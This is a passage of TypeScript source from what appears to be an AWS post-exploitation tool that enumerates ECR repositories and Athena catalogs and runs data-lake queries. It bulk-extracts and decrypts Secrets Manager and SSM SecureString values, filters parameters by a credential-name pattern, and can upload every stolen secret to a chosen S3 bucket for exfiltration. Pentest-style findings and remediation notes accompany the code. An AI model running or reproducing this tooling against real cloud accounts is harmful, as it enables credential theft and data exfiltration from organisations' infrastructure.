        output.push(`\n[+] ECR Auth for pull:`)
        output.push(`    docker login -u ${parts[0]} -p ${parts[1]?.slice(0, 20)}... ${t.endpoint}`)
        output.push(`    docker pull ${targets[0]?.[1]}:latest`)
      }
    }
  } else {
    output.push(`\n[*] Use --repository NAME --pull to get auth token for image pull`)
  }

  const publicRepos = await aws(
    ["ecr-public", "describe-repositories", "--query", "repositories[].[repositoryName,repositoryUri]"],
    profile,
    region,
    timeout,
  )
  if (publicRepos.exitCode === 0) {
    const prl = tryJson(publicRepos.stdout) || []
    if (prl.length) {
      output.push(`\n[+] Public ECR Repositories: ${prl.length}`)
      for (const pr of prl) output.push(`  ${pr[0]}  URI: ${pr[1]}`)
    }
  }

  return { output: output.join("\n"), findings }
}

export async function athenaQuery(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const query = argVal(args, "--query-string")
  const database = argVal(args, "--database")
  const outputBucket = argVal(args, "--output-bucket")
  const findings: Finding[] = []
  const output: string[] = ["[*] Athena Data Lake Query\n"]

  const catalogs = await aws(
    ["athena", "list-data-catalogs", "--query", "DataCatalogsSummary[].[CatalogName,Type]"],
    profile,
    region,
    timeout,
  )
  if (catalogs.exitCode !== 0)
    return { output: output.join("\n") + "\n[-] Access denied: athena:ListDataCatalogs", findings }

  const cl = tryJson(catalogs.stdout) || []
  output.push(`[+] Data catalogs: ${cl.length}`)
  for (const c of cl) output.push(`  ${c[0]}  Type: ${c[1]}`)

  const databases = await aws(
    ["athena", "list-databases", "--catalog-name", "AwsDataCatalog", "--query", "DatabaseList[].[Name,Description]"],
    profile,
    region,
    timeout,
  )
  if (databases.exitCode === 0) {
    const dl = tryJson(databases.stdout) || []
    output.push(`\n[+] Databases (Glue catalog): ${dl.length}`)
    for (const d of dl) {
      output.push(`  ${d[0]}${d[1] ? ` — ${d[1]}` : ""}`)

      const tables = await aws(
        [
          "athena",
          "list-table-metadata",
          "--catalog-name",
          "AwsDataCatalog",
          "--database-name",
          d[0],
          "--query",
          "TableMetadataList[].[Name,TableType,Columns | length(@)]",
        ],
        profile,
        region,
        timeout,
      )
      if (tables.exitCode === 0) {
        const tl = tryJson(tables.stdout) || []
        for (const t of tl) output.push(`    Table: ${t[0]}  Type: ${t[1]}  Columns: ${t[2]}`)
      }
    }
  }

  const workgroups = await aws(
    ["athena", "list-work-groups", "--query", "WorkGroups[].[Name,State,EngineVersion.EffectiveEngineVersion]"],
    profile,
    region,
    timeout,
  )
  if (workgroups.exitCode === 0) {
    const wl = tryJson(workgroups.stdout) || []
    output.push(`\n[+] Workgroups: ${wl.length}`)
    for (const w of wl) {
      output.push(`  ${w[0]}  State: ${w[1]}  Engine: ${w[2]}`)

      const wgDetail = await aws(
        [
          "athena",
          "get-work-group",
          "--work-group",
          w[0],
          "--query",
          "WorkGroup.Configuration.ResultConfiguration.OutputLocation",
        ],
        profile,
        region,
        timeout,
      )
      if (wgDetail.exitCode === 0) {
        const loc = tryJson(wgDetail.stdout)
        if (loc) output.push(`    Output: ${loc}`)
      }
    }
  }

  const recent = await aws(
    ["athena", "list-query-executions", "--work-group", "primary", "--query", "QueryExecutionIds[0:5]"],
    profile,
    region,
    timeout,
  )
  if (recent.exitCode === 0) {
    const ids = tryJson(recent.stdout) || []
    if (ids.length) {
      output.push(`\n[+] Recent queries:`)
      for (const id of ids) {
        const detail = await aws(
          [
            "athena",
            "get-query-execution",
            "--query-execution-id",
            id,
            "--query",
            "QueryExecution.{query:Query,status:Status.State,submitted:Status.SubmissionDateTime,output:ResultConfiguration.OutputLocation}",
          ],
          profile,
          region,
          timeout,
        )
        if (detail.exitCode === 0) {
          const d = tryJson(detail.stdout)
          if (d) {
            output.push(`  [${d.status}] ${String(d.query).slice(0, 100)}`)
            if (d.output) output.push(`    Output: ${d.output}`)
          }
        }
      }
    }
  }

  if (!query) {
    output.push(`\n[*] Usage: awshook athena_query --query-string "SELECT * FROM db.table LIMIT 10" --database mydb`)
    output.push(`[*] Results written to workgroup's S3 output location`)
    findings.push({
      checkId: "AWS-EXFIL-009",
      provider: "aws",
      severity: "high",
      status: "ACCESSIBLE",
      resource: "athena:catalog",
      title: "Athena data catalog accessible — S3 data lake queryable",
      details: "Can run SQL queries against S3 data via Glue catalog tables",
      remediation: "Restrict athena:StartQueryExecution and glue:GetTable permissions",
    })
    return { output: output.join("\n"), findings }
  }

  const outputLoc = outputBucket ? `s3://${outputBucket}/athena-results/` : undefined
  const execArgs = [
    "athena",
    "start-query-execution",
    "--query-string",
    query,
    ...(database ? ["--query-execution-context", `Database=${database}`] : []),
    ...(outputLoc ? ["--result-configuration", `OutputLocation=${outputLoc}`] : []),
  ]

  const exec = await aws(execArgs, profile, region, timeout)
  if (exec.exitCode !== 0) {
    output.push(`\n[-] Query failed: ${exec.stderr.trim()}`)
    return { output: output.join("\n"), findings }
  }

  const execId = tryJson(exec.stdout)?.QueryExecutionId
  output.push(`\n[+] Query submitted: ${execId}`)

  let queryStatus = "RUNNING"
  for (let i = 0; i < 30 && (queryStatus === "RUNNING" || queryStatus === "QUEUED"); i++) {
    await new Promise((r) => setTimeout(r, 2000))
    const check = await aws(
      ["athena", "get-query-execution", "--query-execution-id", execId, "--query", "QueryExecution.Status.State"],
      profile,
      region,
      timeout,
    )
    queryStatus = tryJson(check.stdout) || "UNKNOWN"
  }

  if (queryStatus === "SUCCEEDED") {
    const results = await aws(
      ["athena", "get-query-results", "--query-execution-id", execId, "--max-items", "20"],
      profile,
      region,
      timeout,
    )
    if (results.exitCode === 0) {
      const r = tryJson(results.stdout)
      const rows = r?.ResultSet?.Rows || []
      output.push(`[+] Query succeeded — ${rows.length} rows returned:`)
      for (const row of rows.slice(0, 20)) {
        const vals = (row.Data || []).map((d: Record<string, string>) => d.VarCharValue || "null")
        output.push(`  ${vals.join(" | ")}`)
      }
      findings.push({
        checkId: "AWS-EXFIL-010",
        provider: "aws",
        severity: "critical",
        status: "EXTRACTED",
        resource: `athena:query:${execId}`,
        title: `Athena query executed: ${query.slice(0, 60)}`,
        details: `${rows.length} rows returned from data lake query`,
        remediation: "Review athena:StartQueryExecution permissions and data access patterns",
      })
    }
  } else {
    output.push(`[-] Query status: ${queryStatus}`)
  }

  return { output: output.join("\n"), findings }
}

export async function secretsBulkExport(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const destBucket = argVal(args, "--dest-bucket")
  const format = argVal(args, "--format") || "json"
  const findings: Finding[] = []
  const output: string[] = ["[*] Secrets Bulk Export (Secrets Manager + SSM Parameter Store)\n"]

  const secrets: Record<string, string> = {}

  const smList = await aws(
    ["secretsmanager", "list-secrets", "--query", "SecretList[].[Name,ARN,Description,LastChangedDate]"],
    profile,
    region,
    timeout,
  )
  if (smList.exitCode === 0) {
    const sl = tryJson(smList.stdout) || []
    output.push(`[+] Secrets Manager secrets: ${sl.length}`)

    for (const s of sl) {
      const val = await aws(
        [
          "secretsmanager",
          "get-secret-value",
          "--secret-id",
          s[1],
          "--query",
          "{value:SecretString,binary:SecretBinary}",
        ],
        profile,
        region,
        timeout,
      )
      if (val.exitCode === 0) {
        const v = tryJson(val.stdout)
        const secretVal = v?.value || (v?.binary ? `[binary:${v.binary.length}bytes]` : "[empty]")
        secrets[`sm://${s[0]}`] = secretVal
        output.push(`  [+] ${s[0]}: ${String(secretVal).slice(0, 60)}...`)
      } else {
        output.push(`  [-] ${s[0]}: access denied`)
      }
    }
  }

  const ssmParams = await aws(
    ["ssm", "describe-parameters", "--query", "Parameters[].[Name,Type,LastModifiedDate,Description]"],
    profile,
    region,
    timeout,
  )
  if (ssmParams.exitCode === 0) {
    const pl = tryJson(ssmParams.stdout) || []
    const secureParams = pl.filter((p: string[]) => p[1] === "SecureString")
    const plainParams = pl.filter((p: string[]) => p[1] !== "SecureString")

    output.push(`\n[+] SSM Parameters: ${pl.length} (${secureParams.length} SecureString, ${plainParams.length} other)`)

    for (const p of secureParams) {
      const val = await aws(
        ["ssm", "get-parameter", "--name", p[0], "--with-decryption", "--query", "Parameter.Value"],
        profile,
        region,
        timeout,
      )
      if (val.exitCode === 0) {
        const v = tryJson(val.stdout) || val.stdout.trim()
        secrets[`ssm://${p[0]}`] = v
        output.push(`  [+] ${p[0]} (SecureString): ${String(v).slice(0, 60)}...`)
      } else {
        output.push(`  [-] ${p[0]}: decryption denied (missing KMS access)`)
      }
    }

    const secretPattern = /(?:password|secret|key|token|api.?key|credential|private|auth|db.?pass|connection)/i
    const interestingPlain = plainParams.filter((p: string[]) => secretPattern.test(p[0]))
    for (const p of interestingPlain) {
      const val = await aws(
        ["ssm", "get-parameter", "--name", p[0], "--query", "Parameter.Value"],
        profile,
        region,
        timeout,
      )
      if (val.exitCode === 0) {
        const v = tryJson(val.stdout) || val.stdout.trim()
        secrets[`ssm://${p[0]}`] = v
        output.push(`  [+] ${p[0]} (${p[1]}): ${String(v).slice(0, 60)}...`)
      }
    }
  }

  const count = Object.keys(secrets).length
  output.push(`\n[+] Total secrets extracted: ${count}`)

  if (count === 0) return { output: output.join("\n"), findings }

  findings.push({
    checkId: "AWS-EXFIL-011",
    provider: "aws",
    severity: "critical",
    status: "EXTRACTED",
    resource: "secrets:bulk",
    title: `${count} secrets bulk extracted`,
    details: `${Object.keys(secrets).slice(0, 10).join(", ")}${count > 10 ? ` and ${count - 10} more` : ""}`,
    remediation: "Rotate all extracted secrets immediately, restrict IAM permissions for secret access",
  })

  if (destBucket) {
    const exportData =
      format === "json"
        ? JSON.stringify(secrets, null, 2)
        : Object.entries(secrets)
            .map(([k, v]) => `${k}=${v}`)
            .join("\n")

    const tmpFile = `/tmp/cs-secrets-export.${format === "json" ? "json" : "env"}`
    await Bun.write(tmpFile, exportData)

    const key = `secrets-export-${Date.now().toString(36)}.${format === "json" ? "json" : "env"}`
    const upload = await aws(["s3", "cp", tmpFile, `s3://${destBucket}/${key}`], profile, region, timeout)
    if (upload.exitCode === 0) {
      output.push(`[+] Exported to s3://${destBucket}/${key}`)
      findings.push({
        checkId: "AWS-EXFIL-012",
        provider: "aws",
        severity: "critical",
        status: "STAGED",
        resource: `s3:${destBucket}:${key}`,
        title: `Secrets staged to S3: ${destBucket}/${key}`,
        details: `${count} secrets exported as ${format}`,
        remediation: `Delete: aws s3 rm s3://${destBucket}/${key}`,
      })
    }

    await Bun.write(tmpFile, "")
  } else {
    output.push(`\n[*] Use --dest-bucket BUCKET to stage secrets to S3 for extraction`)
    output.push(`[*] Use --format env for KEY=VALUE format (default: json)`)
  }

  return { output: output.join("\n"), findings }
}
